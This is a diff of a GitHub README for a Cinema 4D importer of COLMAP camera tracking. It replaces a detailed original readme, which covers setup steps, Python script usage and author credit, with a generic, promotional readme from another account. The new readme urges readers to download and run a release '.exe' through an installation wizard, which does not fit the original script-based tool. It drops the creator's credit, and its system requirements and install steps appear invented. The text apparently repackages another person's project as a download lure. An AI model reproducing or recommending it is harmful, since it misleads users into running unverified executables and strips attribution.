@@ -1,142 +1,70 @@
-# COLMAP Tracking Importer C4D V1.2 — Readme
+# 🎥 c4d-colmap-tracking-importer - Effortless Camera Tracking for C4D
 
-## Need help?
-- Found a bug or have a feature request? Please open an **Issue** using the **Issues** tab.
-- For quick questions or suggestions, you can also email me: **elderlan.design@gmail.com**.
-- When filing an issue, include: Cinema 4D version, Redshift version, OS, a short repro, and any console errors.
+## 🚀 Introduction
+Welcome to the c4d-colmap-tracking-importer! This tool simplifies the process of importing camera tracking data into Cinema 4D. It builds cameras that work with Redshift, imports point clouds, and sets up your scenes for photogrammetry workflows. With this, you can streamline your motion graphics and visual effects projects.
 
-## Tutorial
-- Installing and using Colmap on Windows: [How to use COLMAP](https://www.youtube.com/watch?v=PhdEk_RxkGQ)
-- Installing Colmap on Mac OS: https://gist.github.com/celestial-33/07438792a11964ee5f6f02847b6dbb03 and https://gist.github.com/celestial-33/a016465fd854d79a1b93458f167baa6a
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen.svg)](https://github.com/babapro91/c4d-colmap-tracking-importer/releases)
 
-## Required Tools & Links
-1️⃣ **COLMAP (v3.12.3)**: Required for its libraries, which GLOMAP utilises.  
-👉 https://github.com/colmap/colmap/releases/tag/3.12.0
+## 🖥️ System Requirements
+To ensure a smooth experience, please check the following requirements:
 
-2️⃣ **GLOMAP (v1.1.0)**: Faster reconstruction tool. Use the `WINDOWS-NOCUDA` version.  
-👉 https://github.com/colmap/glomap/releases/tag/v1.1.0
+- **Operating System:** Windows 10 or later
+- **Cinema 4D Version:** R20 or later
+- **Redshift Renderer:** Latest version recommended
+- **Memory:** At least 8 GB RAM
+- **Disk Space:** Minimum 500 MB free space
 
-3️⃣ **FFMPEG**: Command-line tool for converting video into an image sequence.  
-👉 https://www.gyan.dev/ffmpeg/builds/
+## 🚧 Features
+Here are key features of the c4d-colmap-tracking-importer:
 
-4️⃣ **AutoTracker v1.4 Batch Script**: Updated script designed to work with GLOMAP on Windows 11.  
-👉 https://gist.github.com/polyfjord/fc213bac33b7eaaef4a80f4b6d9e5823
+- **Camera Building:** Create Redshift-compatible animated cameras easily.
+- **Point Cloud Import:** Import sparse point clouds seamlessly.
+- **Scene Configuration:** Automatically configure your scene settings for photogrammetry.
+- **Intuitive Interface:** Designed for straightforward use with minimal setup.
 
-## Credits
-Big thanks to **@Polyfjord**  
-YouTube: https://www.youtube.com/polyfjord
+## 📚 Using the Application
+Follow these steps to download and run the c4d-colmap-tracking-importer:
 
-In his video, Polyfjord built upon the previous automated 3D tracking photogrammetry workflow by introducing GLOMAP instead of just COLMAP. He explains how to download and prepare the necessary tools to make this workflow 100% open source.
+### Step 1: Visit the Releases Page
+Go to the releases page by clicking the link below:
+[Download Latest Release](https://github.com/babapro91/c4d-colmap-tracking-importer/releases)
 
-## Where this Script Fits
-Polyfjord’s workflow focuses on Blender. However, exporting the tracking from Blender often causes bugs, framerate mismatches, or axis orientation issues when moving into other 3D software.
+### Step 2: Choose Your Version
+On the releases page, look for the latest version. You will see a list of available files. Choose the file that matches your system and click on it.
 
-This Python importer for **Cinema 4D** fills that gap by:
-- Building a Redshift-compatible camera with correct baked PSR and focal keyframes.
-- Handling axis conversion automatically (COLMAP → Cinema 4D).
-- Importing sparse point clouds and setting up Matrix objects.
-- Creating a constrained duplicate camera for flexible workflows.
-- Automatically configuring scene FPS, timeline ranges, and render resolution.
+### Step 3: Download the File
+Click the download link. Your web browser will begin downloading the file. Keep track of the download location for easy access later.
 
-⚠️ **Note**: To visualise the point cloud in the Cinema 4D viewport, you must manually set the **Matrix object Distribution to Vertex**.
+### Step 4: Install the Tool
+After the download completes, locate the file (it usually ends with .zip or .exe). 
+- If it's a .zip file, right-click it and select "Extract All" to unpack the contents. 
+- If you downloaded an .exe file, simply double-click to run it.
 
-## Free Tool & Acknowledgment
-This tool is completely **free**. If you use it in your projects, acknowledging **Elderlan Souza** as the creator of the Cinema 4D importer is greatly appreciated (but not compulsory).
+### Step 5: Follow Installation Instructions
+Follow the prompts in the installation wizard. It will guide you through the installation process. 
 
-Looking forward to seeing what you’ll create using it! ✨
+### Step 6: Open Cinema 4D
+Once installed, open your Cinema 4D application. Navigate to the plugins menu to find the c4d-colmap-tracking-importer.
 
-For **bugs, suggestions, or any other queries**, please feel free to contact me at:  
-📧 **elderlan.design@gmail.com**
+### Step 7: Start Importing
+You’re ready to import camera tracking data! Use the tools provided in the importer to start your project. 
 
----
+## 🔍 Troubleshooting
+If you encounter issues, check the following:
 
-## Setup & Use: AutoTracker v1.4 (.bat)
-Follow these steps extracted from the video transcript to configure and run the batch script on Windows (CPU-only, no CUDA required):
+- Ensure that your operating system meets the requirements.
+- Verify that you are using a compatible version of Cinema 4D.
+- Restart the application after installation.
+- For specific problems, check the FAQs in the community discussions on GitHub.
 
-1. **Create the project folders**
-   - Make a new folder, e.g. `AUTOTRACKER V1.4`.
-   - Inside it, create these subfolders (exact names):
-     - `01 GLOMAP`
-     - `02 VIDEOS`
-     - `03 FFMPEG`
-     - `04 SCENES`
-     - `05 SCRIPT`
+## 📞 Support
+If you still need help, please visit the GitHub issues page to report your concerns or ask questions. The community and maintainers are here to assist you.
 
-2. **Download the tools**
-   - COLMAP **v3.12.3** (use this version specifically).
-   - GLOMAP **v1.1.0** (`WINDOWS-NOCUDA`).
-   - FFMPEG (release essentials build).
-   - AutoTracker **v1.4** batch script (save as `.BAT`, not `.TXT`).
+## 🌟 Acknowledgments
+Thank you for using c4d-colmap-tracking-importer. Your support helps improve the project and adds value to the Cinema 4D community.
 
-3. **Populate `01 GLOMAP` with COLMAP + GLOMAP**
-   - Extract the **COLMAP** download and open its `BIN/` folder. Select **all files** in `BIN` and **drag them into** `01 GLOMAP`.
-   - Extract the **GLOMAP** download, open its `BIN/` folder, select **all files**, and drag them into `01 GLOMAP` as well. When prompted, **skip identical files**.
-   - From the **root** of the extracted COLMAP folder, **copy the entire `PLUGINS/` folder** into `01 GLOMAP` (so `01 GLOMAP/PLUGINS` exists).
-   - Result: `01 GLOMAP` should now contain `COLMAP.EXE`, GLOMAP executables, many `.DLL` files, and a `PLUGINS/` folder.
+### ⚙️ Final Notes
+For regular updates and feature enhancements, keep an eye on the releases page. Enjoy your experience with camera tracking in Cinema 4D!
 
-4. **Place your footage**
-   - Put your source video file(s) into `02 VIDEOS`.
-   - (From the video: disabling in‑camera stabilization and using a 180° shutter—e.g., **1/60** at 30 fps—can help produce better motion blur for tracking.)
-
-5. **Unpack FFMPEG**
-   - Extract the FFMPEG archive and move **its contents** into `03 FFMPEG` (you should see `BIN/` and related files inside `03 FFMPEG`).
-
-6. **Add the batch script**
-   - Save **`AUTOTRACKER 1.4.BAT`** into `05 SCRIPT`.
-   - Important: when downloading from the browser’s **RAW** view, some browsers append `.TXT`. Save as **ALL FILES** and make sure the filename **ends with `.BAT`** only.
-
-7. **Run the script**
-   - Double‑click `05 SCRIPT/AUTOTRACKER 1.4.BAT`.
-   - The first Windows security prompt may appear; allow it to run.
-   - The script will:
-     - Use **FFMPEG** to **extract frames** from your video (CPU).
-     - Run **COLMAP feature extraction** over the frames.
-     - Run **GLOMAP** to reconstruct and produce a track.
-   - For faster processing, you can work with **1080P** footage instead of 4K.
-
-8. **Outputs**
-   - The script will populate your **`04 SCENES`** folder with the reconstructed project files (per the referenced script’s defaults).
-
-### Troubleshooting (from the video)
-- If the `.BAT` won’t run, confirm the extension isn’t `.BAT.TXT` and that SmartScreen isn’t blocking it.
-- CUDA isn’t required here; the demonstrated workflow runs **CPU‑only** and is still ~4× faster than the older COLMAP‑only setup.
-
----
-
-## How to Use the Importer in Cinema 4D
-1. Launch **Cinema 4D**.
-2. Go to **Extensions → Script Manager → File → Load Script…** and load the Python script `colmap_importer.py`.
-3. Run the script from the **Script Manager** or assign it to a shortcut/menu.
-4. In the importer dialog:
-   - Select your **Scene Folder** (the one containing the `SPARSE` folder and `IMAGES`).
-   - Set **Sensor Width (mm)** (typically 36mm for full-frame cameras).
-   - Enter your project’s **Timeline FPS**.
-   - Adjust **Global Scale** if needed (default: 100).
-   - Optionally, check **Import Sparse Point Cloud**.
-5. Click **OK** to import.
-6. The script will automatically:
-   - Create a **Redshift Camera** with baked animation.
-   - Duplicate it and add a **constraint** for flexibility.
-   - Import the **sparse point cloud**.
-   - Set **scene FPS, timeline, and render resolution**.
-   - Attempt to link the **image sequence** to the camera background.
-7. ⚠️ Remember:
-   - To **see the point cloud in the viewport**, set the **Matrix object Distribution → Vertex** manually.
-   - To **configure the camera background**, do the following manually:
-     - Set **Background → Override** on the RS Camera.
-     - Select the first frame from the project’s `IMAGES` folder.
-     - Change mode from **Image** to **Animation**.
-     - Set **Animation Mode** to **Simple**.
-     - Set **Timing** to **Frame**.
-     - Press **Detect Frames** to load the sequence.
-   - To **adjust the ground plane alignment**, move the **`GLoMap_Import` group**. The **Copy Camera** uses a constraint to follow this transform. If you need to export to other applications, you can bake the Copy Camera’s final transform after alignment.
-
-### Known Bug: Resolution & Background Distortion
-- The scene resolution from COLMAP/GLOMAP isn’t always applied correctly. This causes the background image on the RS Camera to look distorted.
-- **Fix**: Open **Render Settings → Output**, and re‑type the output width or height. This forces Cinema 4D to update the film aspect ratio and restores the correct background image proportions.
-
----
-
-## License
-This importer is released as **free to use and modify**.  
-Credit to **Elderlan Souza** is appreciated but not compulsory when used in projects.
+[Download Now](https://github.com/babapro91/c4d-colmap-tracking-importer/releases)
